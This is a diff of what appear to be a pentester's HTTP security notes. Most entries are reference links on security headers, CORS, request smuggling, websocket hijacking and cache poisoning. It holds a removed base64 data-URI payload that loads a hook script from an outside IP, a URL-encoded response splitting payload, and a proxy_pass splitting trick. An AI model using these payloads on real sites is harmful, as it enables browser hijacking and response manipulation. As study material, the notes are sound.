@@ -1,6 +1,6 @@
 # http
 
-# http://guides.rubyonrails.org/security.html https://www.cyber.gov.au/acsc/view-all-content/publications/protecting-web-applications-and-users
+# Security Headers http://guides.rubyonrails.org/security.html https://www.cyber.gov.au/acsc/view-all-content/publications/protecting-web-applications-and-users
 X-Frame-Options 'SAMEORIGIN' - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' or ALLOW-FROM to allows all, one or more origins (wildcards are not permitted)
 X-XSS-Protection '1; mode=block' - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off (useful if response contents scripts from request parameters)
 X-Content-Type-Options 'nosniff' - stops the browser from guessing the MIME type of a file
@@ -8,20 +8,20 @@ X-Content-Security-Policy - mitigates attacks such as cross-site scripting (XSS)
 Access-Control-Allow-Origin - control which sites are allowed to bypass same origin policies and send cross-origin requests
 Strict-Transport-Security: max-age=31536000 ; includeSubDomains - forces the browser to always interact with the site over HTTPS
 
-# CORS (Access-Control-Allow-Origin)
-The Same-origin policy does not prevent requests being made to other origins, but disables access to the response from JavaScript. CORS headers allow access to cross-origin responses.
+# CORS
+The Same-Origin Policy does not prevent requests being made to other origins, but disables access to the response from JavaScript. CORS headers allow access to cross-origin responses.
 https://medium.com/statuscode/cors-a-guided-tour-4e72230a8739#.vrov01jfg pitfall: allow credentials without whitelist
 https://ejj.io/breaking-sop/
 https://ejj.io/misconfigured-cors/
 http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
 https://www.corben.io/advanced-cors-techniques/
 
+# CORP, COOP, CORB
+https://w3c.github.io/webappsec-post-spectre-webdev/
+
 # CSP
 https://csp-evaluator.withgoogle.com/
 https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
-
-# bypass same origin (SOP)
-use data uri like data:text/html;base64,PGh0bWw+CjxzY3JpcHQgc3JjPSAiaHR0cDovLzEwNC4xMzEuNS4xNTA6ODAwMC9ob29rLmpzIjsgIHR5cGU9ICJ0ZXh0L2phdmFzY3JpcHQiID48L3NjcmlwdD4KPC9odG1sPgo=
 
 # if there's a reverse proxy removing the Server: try to send http header with invalid values like with the Expect: header
 # BigIP <-> Tomcat
@@ -51,10 +51,15 @@ Host: 10.10.220.230
 Accept: */*
 User-Agent: Mozilla/5.0
 
+# http request splitting
+https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
+proxy_pass http://unix://tmp/socket
+
 # http response splitting
 language=fr%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>
 
 # websockets
+https://sharan-panegav.medium.com/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50
 https://cybercx.com.au/blog/logrhythm-zero-days/
 https://github.com/0ang3el/websocket-smuggle
 https://www.notsosecure.com/blog/2014/11/27/how-cross-site-websocket-hijacking-could-lead-to-full-session-compromise/
@@ -65,11 +70,13 @@ https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-
 # socket poisoning / http desync / http request smuggling
 https://zonduu.me/posts/http-smuggling-writeup
 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf
 http://projects.webappsec.org/w/page/13246928/HTTP%20Request%20Smuggling
 https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
 
 # web cache poisoning
 https://portswigger.net/research/practical-web-cache-poisoning
+https://portswigger.net/research/web-cache-entanglement
 
 # tabnabbing
 https://owasp.org/www-community/attacks/Reverse_Tabnabbing
